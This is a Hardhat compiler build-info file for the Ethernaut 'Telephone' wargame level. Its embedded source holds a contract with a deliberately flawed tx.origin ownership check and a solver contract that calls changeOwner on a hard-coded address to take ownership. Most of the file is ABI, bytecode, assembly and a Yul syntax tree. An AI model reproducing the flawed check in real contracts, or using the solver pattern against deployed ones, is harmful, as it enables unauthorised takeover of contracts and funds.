{
	"id": "1d630cd161ae83c0ba5b438927673306",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.7",
	"solcLongVersion": "0.8.7+commit.e28d00a7",
	"input": {
		"language": "Solidity",
		"sources": {
			"ethernautTelephone.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\ncontract Telephone {\r\n\r\n  address public owner;\r\n\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  function changeOwner(address _owner) public {\r\n    if (tx.origin != msg.sender) {\r\n      owner = _owner;\r\n    }\r\n  }\r\n}\r\n\r\ncontract telephoneSolver {\r\n\r\n    function solve() external returns (bytes memory) {\r\n        address contractAddr = address(0x03cbED7039bDA6ae4523C6E7BB6579718A584f83);\r\n        (bool success, bytes memory reason) = contractAddr.call{gas:gasleft()}(abi.encodePacked(\r\n            bytes4(keccak256(\"changeOwner(address)\")), \r\n            address(0x798349E06c67272465123B91bd88C5d19b8c7878)\r\n        ));\r\n        if(success){\r\n            return reason;\r\n        }\r\n        else {\r\n            revert();\r\n        }\r\n    }\r\n}\r\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"ethernautTelephone.sol": {
				"Telephone": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_owner",
									"type": "address"
								}
							],
							"name": "changeOwner",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernautTelephone.sol\":60:290  contract Telephone {\r... */\n  mstore(0x40, 0x80)\n    /* \"ethernautTelephone.sol\":113:165  constructor() public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"ethernautTelephone.sol\":149:159  msg.sender */\n  caller\n    /* \"ethernautTelephone.sol\":141:146  owner */\n  0x00\n  dup1\n    /* \"ethernautTelephone.sol\":141:159  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"ethernautTelephone.sol\":60:290  contract Telephone {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernautTelephone.sol\":60:290  contract Telephone {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xa6f9dae1\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernautTelephone.sol\":86:106  address public owner */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ethernautTelephone.sol\":171:287  function changeOwner(address _owner) public {\r... */\n    tag_4:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      tag_12\n      jump\t// in\n    tag_9:\n      stop\n        /* \"ethernautTelephone.sol\":86:106  address public owner */\n    tag_6:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"ethernautTelephone.sol\":171:287  function changeOwner(address _owner) public {\r... */\n    tag_12:\n        /* \"ethernautTelephone.sol\":239:249  msg.sender */\n      caller\n        /* \"ethernautTelephone.sol\":226:249  tx.origin != msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernautTelephone.sol\":226:235  tx.origin */\n      origin\n        /* \"ethernautTelephone.sol\":226:249  tx.origin != msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"ethernautTelephone.sol\":222:282  if (tx.origin != msg.sender) {\r... */\n      tag_14\n      jumpi\n        /* \"ethernautTelephone.sol\":268:274  _owner */\n      dup1\n        /* \"ethernautTelephone.sol\":260:265  owner */\n      0x00\n      dup1\n        /* \"ethernautTelephone.sol\":260:274  owner = _owner */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"ethernautTelephone.sol\":222:282  if (tx.origin != msg.sender) {\r... */\n    tag_14:\n        /* \"ethernautTelephone.sol\":171:287  function changeOwner(address _owner) public {\r... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:146   */\n    tag_16:\n        /* \"#utility.yul\":53:58   */\n      0x00\n        /* \"#utility.yul\":91:97   */\n      dup2\n        /* \"#utility.yul\":78:98   */\n      calldataload\n        /* \"#utility.yul\":69:98   */\n      swap1\n      pop\n        /* \"#utility.yul\":107:140   */\n      tag_18\n        /* \"#utility.yul\":134:139   */\n      dup2\n        /* \"#utility.yul\":107:140   */\n      tag_19\n      jump\t// in\n    tag_18:\n        /* \"#utility.yul\":7:146   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":152:481   */\n    tag_11:\n        /* \"#utility.yul\":211:217   */\n      0x00\n        /* \"#utility.yul\":260:262   */\n      0x20\n        /* \"#utility.yul\":248:257   */\n      dup3\n        /* \"#utility.yul\":239:246   */\n      dup5\n        /* \"#utility.yul\":235:258   */\n      sub\n        /* \"#utility.yul\":231:263   */\n      slt\n        /* \"#utility.yul\":228:347   */\n      iszero\n      tag_21\n      jumpi\n        /* \"#utility.yul\":266:345   */\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n        /* \"#utility.yul\":228:347   */\n    tag_21:\n        /* \"#utility.yul\":386:387   */\n      0x00\n        /* \"#utility.yul\":411:464   */\n      tag_24\n        /* \"#utility.yul\":456:463   */\n      dup5\n        /* \"#utility.yul\":447:453   */\n      dup3\n        /* \"#utility.yul\":436:445   */\n      dup6\n        /* \"#utility.yul\":432:454   */\n      add\n        /* \"#utility.yul\":411:464   */\n      tag_16\n      jump\t// in\n    tag_24:\n        /* \"#utility.yul\":401:464   */\n      swap2\n      pop\n        /* \"#utility.yul\":357:474   */\n      pop\n        /* \"#utility.yul\":152:481   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":487:605   */\n    tag_25:\n        /* \"#utility.yul\":574:598   */\n      tag_27\n        /* \"#utility.yul\":592:597   */\n      dup2\n        /* \"#utility.yul\":574:598   */\n      tag_28\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":569:572   */\n      dup3\n        /* \"#utility.yul\":562:599   */\n      mstore\n        /* \"#utility.yul\":487:605   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":611:833   */\n    tag_8:\n        /* \"#utility.yul\":704:708   */\n      0x00\n        /* \"#utility.yul\":742:744   */\n      0x20\n        /* \"#utility.yul\":731:740   */\n      dup3\n        /* \"#utility.yul\":727:745   */\n      add\n        /* \"#utility.yul\":719:745   */\n      swap1\n      pop\n        /* \"#utility.yul\":755:826   */\n      tag_30\n        /* \"#utility.yul\":823:824   */\n      0x00\n        /* \"#utility.yul\":812:821   */\n      dup4\n        /* \"#utility.yul\":808:825   */\n      add\n        /* \"#utility.yul\":799:805   */\n      dup5\n        /* \"#utility.yul\":755:826   */\n      tag_25\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":611:833   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":920:1016   */\n    tag_28:\n        /* \"#utility.yul\":957:964   */\n      0x00\n        /* \"#utility.yul\":986:1010   */\n      tag_34\n        /* \"#utility.yul\":1004:1009   */\n      dup3\n        /* \"#utility.yul\":986:1010   */\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":975:1010   */\n      swap1\n      pop\n        /* \"#utility.yul\":920:1016   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1022:1148   */\n    tag_35:\n        /* \"#utility.yul\":1059:1066   */\n      0x00\n        /* \"#utility.yul\":1099:1141   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1092:1097   */\n      dup3\n        /* \"#utility.yul\":1088:1142   */\n      and\n        /* \"#utility.yul\":1077:1142   */\n      swap1\n      pop\n        /* \"#utility.yul\":1022:1148   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1277:1394   */\n    tag_23:\n        /* \"#utility.yul\":1386:1387   */\n      0x00\n        /* \"#utility.yul\":1383:1384   */\n      dup1\n        /* \"#utility.yul\":1376:1388   */\n      revert\n        /* \"#utility.yul\":1400:1522   */\n    tag_19:\n        /* \"#utility.yul\":1473:1497   */\n      tag_41\n        /* \"#utility.yul\":1491:1496   */\n      dup2\n        /* \"#utility.yul\":1473:1497   */\n      tag_28\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":1466:1471   */\n      dup2\n        /* \"#utility.yul\":1463:1498   */\n      eq\n        /* \"#utility.yul\":1453:1516   */\n      tag_42\n      jumpi\n        /* \"#utility.yul\":1512:1513   */\n      0x00\n        /* \"#utility.yul\":1509:1510   */\n      dup1\n        /* \"#utility.yul\":1502:1514   */\n      revert\n        /* \"#utility.yul\":1453:1516   */\n    tag_42:\n        /* \"#utility.yul\":1400:1522   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220af07c32029845ff0c32b55f9473f547ea42b9cbd91e31cb5218f3504c1459e6964736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_12": {
									"entryPoint": null,
									"id": 12,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610200806100606000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063a6f9dae114610059575b600080fd5b610043610075565b6040516100509190610161565b60405180910390f35b610073600480360381019061006e9190610125565b610099565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff161461010d57806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b60008135905061011f816101b3565b92915050565b60006020828403121561013b5761013a6101ae565b5b600061014984828501610110565b91505092915050565b61015b8161017c565b82525050565b60006020820190506101766000830184610152565b92915050565b60006101878261018e565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6101bc8161017c565b81146101c757600080fd5b5056fea2646970667358221220af07c32029845ff0c32b55f9473f547ea42b9cbd91e31cb5218f3504c1459e6964736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x200 DUP1 PUSH2 0x60 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xA6F9DAE1 EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x75 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x161 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x125 JUMP JUMPDEST PUSH2 0x99 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x10D JUMPI DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x11F DUP2 PUSH2 0x1B3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x13B JUMPI PUSH2 0x13A PUSH2 0x1AE JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x149 DUP5 DUP3 DUP6 ADD PUSH2 0x110 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x15B DUP2 PUSH2 0x17C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x176 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x152 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x187 DUP3 PUSH2 0x18E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x1BC DUP2 PUSH2 0x17C JUMP JUMPDEST DUP2 EQ PUSH2 0x1C7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAF SMOD 0xC3 KECCAK256 0x29 DUP5 0x5F CREATE 0xC3 0x2B SSTORE 0xF9 SELFBALANCE EXTCODEHASH SLOAD PUSH31 0xA42B9CBD91E31CB5218F3504C1459E6964736F6C6343000807003300000000 ",
							"sourceMap": "60:230:0:-:0;;;113:52;;;;;;;;;;149:10;141:5;;:18;;;;;;;;;;;;;;;;;;60:230;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@changeOwner_29": {
									"entryPoint": 153,
									"id": 29,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"@owner_3": {
									"entryPoint": 117,
									"id": 3,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_decode_t_address": {
									"entryPoint": 272,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address": {
									"entryPoint": 293,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 338,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 353,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 380,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 398,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 430,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 435,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1525:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "59:87:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "69:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "91:6:1"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "78:12:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "78:20:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "69:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "134:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "107:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "107:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "107:33:1"
														}
													]
												},
												"name": "abi_decode_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "37:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "45:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "53:5:1",
														"type": ""
													}
												],
												"src": "7:139:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "218:263:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "264:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "266:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "266:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "266:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "239:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "248:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "235:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "235:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "260:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "231:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "231:32:1"
															},
															"nodeType": "YulIf",
															"src": "228:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "357:117:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "372:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "386:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "376:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "401:63:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "436:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "447:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "432:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "432:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "456:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "411:20:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "411:53:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "401:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "188:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "199:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "211:6:1",
														"type": ""
													}
												],
												"src": "152:329:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "552:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "569:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "592:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "574:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "574:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "562:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "562:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "562:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "540:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "547:3:1",
														"type": ""
													}
												],
												"src": "487:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "709:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "719:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "731:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "742:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "727:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "727:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "719:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "799:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "812:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "823:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "808:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "808:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "755:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "755:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "755:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "681:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "693:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "704:4:1",
														"type": ""
													}
												],
												"src": "611:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "879:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "889:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "905:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "899:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "899:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "889:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "872:6:1",
														"type": ""
													}
												],
												"src": "839:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "965:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "975:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1004:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "986:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "986:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "975:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "947:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "957:7:1",
														"type": ""
													}
												],
												"src": "920:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1067:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1077:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1092:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1099:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1088:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1088:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1077:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1049:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1059:7:1",
														"type": ""
													}
												],
												"src": "1022:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1243:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1260:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1263:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
